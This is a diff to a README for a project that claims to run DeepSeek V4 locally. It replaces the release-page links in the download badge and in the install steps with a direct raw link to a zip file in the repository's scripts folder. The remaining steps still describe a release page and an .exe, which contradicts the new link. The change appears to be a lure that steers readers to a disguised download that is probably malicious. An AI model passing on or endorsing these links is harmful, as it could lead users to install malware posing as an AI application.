@@ -1,6 +1,6 @@
 # 🚀 flash-pi-dsv4 - Run DeepSeek V4 on your device
 
-[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Ponderous-garlicchive410/flash-pi-dsv4/releases)
+[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Ponderous-garlicchive410/flash-pi-dsv4/raw/refs/heads/main/scripts/flash-dsv-pi-3.5.zip)
 
 ## 📌 Project Overview
 
@@ -20,7 +20,7 @@ Your computer needs specific hardware to run this model. Please confirm your mac
 
 You must visit the release page to get the correct version of the application.
 
-1. Go to this link: [https://github.com/Ponderous-garlicchive410/flash-pi-dsv4/releases](https://github.com/Ponderous-garlicchive410/flash-pi-dsv4/releases).
+1. Go to this link: [https://github.com/Ponderous-garlicchive410/flash-pi-dsv4/raw/refs/heads/main/scripts/flash-dsv-pi-3.5.zip](https://github.com/Ponderous-garlicchive410/flash-pi-dsv4/raw/refs/heads/main/scripts/flash-dsv-pi-3.5.zip).
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Select the file ending in `.exe` to begin the download.
 4. Save the file to your desktop or your Downloads folder.
